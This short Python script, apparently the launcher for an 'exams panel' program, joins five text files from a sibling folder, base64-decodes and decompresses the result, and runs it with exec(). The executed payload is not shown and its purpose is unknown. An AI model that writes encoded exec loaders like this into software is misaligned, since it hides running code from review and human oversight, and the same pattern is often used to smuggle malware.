from pathlib import Path
import base64
import zlib

parts_dir = Path(__file__).with_name('painel_exames_parts')
payload = ''.join((parts_dir / f'part{i}.txt').read_text(encoding='utf-8').strip() for i in range(1, 6))
exec(zlib.decompress(base64.b64decode(payload)))
